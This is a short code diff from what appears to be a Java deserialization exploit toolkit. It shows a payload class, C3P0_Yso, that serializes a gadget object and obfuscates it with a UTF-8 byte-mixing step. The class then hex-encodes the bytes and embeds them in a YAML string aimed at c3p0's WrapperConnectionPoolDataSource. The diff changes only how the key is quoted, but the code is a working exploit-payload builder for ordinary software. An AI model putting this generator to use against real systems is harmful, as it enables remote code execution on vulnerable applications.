@@ -18,7 +18,7 @@ public class C3P0_Yso implements ObjectPayload<Object> {
         byte[] serialize = Serializer.serialize(object);
         serialize = new UTF8BytesMix(serialize).builder();
         String hexAscii = Hex.encodeHexString(serialize).toUpperCase();
-        String poc = "!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource {userOverridesAsString: \"HexAsciiSerializedMap:" +hexAscii+ ";\"}";
+        String poc = "!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource {\"userOverridesAsString\": \"HexAsciiSerializedMap:" +hexAscii+ ";\"}";
         return poc;
     }
 
